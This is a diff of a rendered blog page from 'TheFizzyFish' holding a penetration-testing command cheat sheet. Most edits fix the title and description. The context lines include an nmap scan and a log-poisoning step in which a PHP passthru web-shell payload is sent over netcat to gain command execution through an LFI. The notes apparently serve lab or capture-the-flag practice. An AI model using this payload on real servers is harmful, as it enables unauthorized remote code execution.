@@ -6,7 +6,7 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
-<meta name="description" content="Command commands" />
+<meta name="description" content="Common commands" />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -15,7 +15,7 @@
 
     <title>
         
-            common.txt :: TheFizzyFish 
+            common :: TheFizzyFish 
         
     </title>
 
@@ -37,17 +37,17 @@
 
 
 
-  <meta itemprop="name" content="common.txt">
-  <meta itemprop="description" content="Command commands">
+  <meta itemprop="name" content="common">
+  <meta itemprop="description" content="Common commands">
   <meta itemprop="datePublished" content="2024-08-24T16:50:47-04:00">
   <meta itemprop="dateModified" content="2024-08-24T16:50:47-04:00">
-  <meta itemprop="wordCount" content="819">
+  <meta itemprop="wordCount" content="835">
   <meta itemprop="image" content="http://localhost:1313/">
 
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="http://localhost:1313/">
-  <meta name="twitter:title" content="common.txt">
-  <meta name="twitter:description" content="Command commands">
+  <meta name="twitter:title" content="common">
+  <meta name="twitter:description" content="Common commands">
 
 
 
@@ -121,7 +121,7 @@
         </div>
 
         <article>
-            <h2 class="post-title"><a href="http://localhost:1313/common/">common.txt</a></h2>
+            <h2 class="post-title"><a href="http://localhost:1313/common/">common</a></h2>
 
             
             
@@ -164,7 +164,8 @@
 </span></span><span style="display:flex;"><span>nmap -p &lt;ports list&gt; -A $IP
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------- Add host to /etc/hosts ----------------------
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span>$IP<span style="color:#e6db74"> &lt;hostname&gt;&#34;</span> | sudo tee -a /etc/hosts
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>------------------WEB CONTENT ---------------------------------------------------------------------------
@@ -345,7 +346,7 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-------------------------------------------Log Poisoning-------------------------------
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># If there&#39;</span>s an LFI, check <span style="color:#66d9ef">for</span> access to log files <span style="color:#f92672">(</span>apache/nginx<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attempt to add a php code execution parameter</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attempt to add a php code execution parameter (log poisoning)</span>
 </span></span><span style="display:flex;"><span>nc -nv $IP &lt;port&gt;
 </span></span><span style="display:flex;"><span>GET /&lt;?php passthru<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;fish&#39;</span><span style="color:#f92672">])</span>;?&gt;
 </span></span><span style="display:flex;"><span>
